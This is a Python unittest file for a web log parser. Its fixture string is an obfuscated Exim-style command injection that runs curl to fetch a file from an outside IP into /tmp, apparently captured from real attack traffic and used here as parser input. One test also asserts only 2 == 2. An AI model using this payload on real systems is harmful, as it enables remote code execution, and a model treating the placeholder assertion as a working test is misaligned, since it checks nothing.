"""This file contains code for testing the base web log reader

Running:
- `python3 -m logparsers.tests.weblog_test`
"""

import unittest

from ..web import parse_weblog_timestamp, normalize_space


MSTRING = '''target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}-o${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}69.64.61.196${substr{0}{1}{$spool_directory}}rce.txt}} null)'''


class WebogfileReaderTest(unittest.TestCase):

    def testTimestamp(self):
        s = '08/Nov/2017:06:23:57 +0100'
        d = parse_weblog_timestamp(s)
        self.assertEqual(d.hour, 5)

    def testNormalizeSpace(self):
        s = normalize_space(MSTRING)
        print(len(s))
        print(repr(MSTRING))
        # print(s)
        self.assertEqual(2, 2)


unittest.main()
